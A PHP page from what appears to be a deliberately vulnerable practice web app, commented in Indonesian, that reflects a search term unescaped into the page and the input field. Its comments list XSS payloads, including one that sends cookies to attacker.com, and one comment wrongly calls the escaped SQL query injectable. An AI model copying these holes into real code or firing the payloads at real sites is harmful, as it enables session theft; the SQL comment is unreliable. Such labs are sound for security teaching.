<?php
/**
 * Search/Reflected XSS Page
 * 
 * INTENTIONALLY VULNERABLE TO: REFLECTED XSS
 * 
 * Vulnerability explanation:
 * - Query parameter ditampilkan langsung ke halaman tanpa escaping
 * - Tidak disimpan ke database, hanya ditampilkan di halaman (reflected)
 * - Attacker bisa share URL dengan payload XSS yang akan dijalankan saat link diklik
 * 
 * Contoh payload Reflected XSS:
 * URL: http://localhost/myOwn-ivwa/search.php?q=<img src=x onerror="alert('XSS')">
 * 
 * atau lebih sophisticated:
 * URL: http://localhost/myOwn-ivwa/search.php?q=test<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
 */

session_start();

// Check apakah user sudah login
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

require_once 'config/db.php';

$search_query = '';
$search_results = [];

// Handle search
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['q'])) {
    $search_query = $_GET['q'];
    
    // VULNERABILITY: Query parameter digunakan langsung dalam SQL query
    // Ini juga merupakan SQL Injection vulnerability!
    $query = "SELECT * FROM comments WHERE comment_text LIKE '%" . 
             $conn->real_escape_string($search_query) . "%' LIMIT 10";
    
    $result = $conn->query($query);
    if ($result) {
        while ($row = $result->fetch_assoc()) {
            $search_results[] = $row;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IVWA - Search</title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
    <div class="container">
        <nav class="navbar">
            <div class="navbar-brand">IVWA - Search</div>
            <div class="navbar-user">
                <span>Logged in as: <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong></span>
                <a href="dashboard.php" class="btn btn-secondary">Dashboard</a>
                <a href="logout.php" class="btn btn-danger">Logout</a>
            </div>
        </nav>
        
        <div class="dashboard-content">
            <h1>Search Comments</h1>
            
            <div class="search-form">
                <form method="GET" action="search.php">
                    <div class="form-group">
                        <label for="search_query">Search Query:</label>
                        <input type="text" id="search_query" name="q" 
                               value="<?php echo $_GET['q'] ?? ''; ?>"
                               placeholder="Search comments...">
                    </div>
                    <button type="submit" class="btn btn-primary">Search</button>
                </form>
            </div>
            
            <!-- VULNERABILITY: Search parameter ditampilkan tanpa escaping! -->
            <?php if ($search_query !== ''): ?>
                <div class="search-info">
                    <!-- VULNERABLE: Query parameter langsung di-echo tanpa htmlspecialchars! -->
                    <h2>Search results for: 
                        <?php echo $search_query; ?>
                    </h2>
                    <!-- END VULNERABILITY -->
                    <p>Found <?php echo count($search_results); ?> result(s)</p>
                </div>
                
                <?php if (count($search_results) > 0): ?>
                    <div class="search-results">
                        <?php foreach ($search_results as $result): ?>
                            <div class="comment-item">
                                <div class="comment-header">
                                    <strong><?php echo htmlspecialchars($result['username']); ?></strong>
                                    <span class="comment-date">
                                        <?php echo date('Y-m-d H:i', strtotime($result['created_at'])); ?>
                                    </span>
                                </div>
                                <div class="comment-text">
                                    <?php echo htmlspecialchars($result['comment_text']); ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php else: ?>
                    <div class="alert alert-info">
                        No comments found matching your search query.
                    </div>
                <?php endif; ?>
            <?php endif; ?>
            
            <div class="vulnerability-info">
                <h3>⚠️ Reflected XSS Vulnerability Info</h3>
                <p>Halaman ini SENGAJA vulnerable terhadap Reflected XSS!</p>
                <p><strong>Coba URL payload:</strong></p>
                <code>?q=&lt;img src=x onerror="alert('XSS')"&gt;</code>
                <br><br>
                <code>?q=&lt;svg onload="alert('Reflected XSS')"&gt;</code>
                <br><br>
                <p><strong>Atau copy-paste URL ini ke address bar:</strong></p>
                <code style="word-break: break-all;">
                    http://localhost/myOwn-ivwa/search.php?q=&lt;img%20src=x%20onerror="alert('Reflected%20XSS')"&gt;
                </code>
            </div>
        </div>
    </div>
</body>
</html>

<?php $conn->close(); ?>
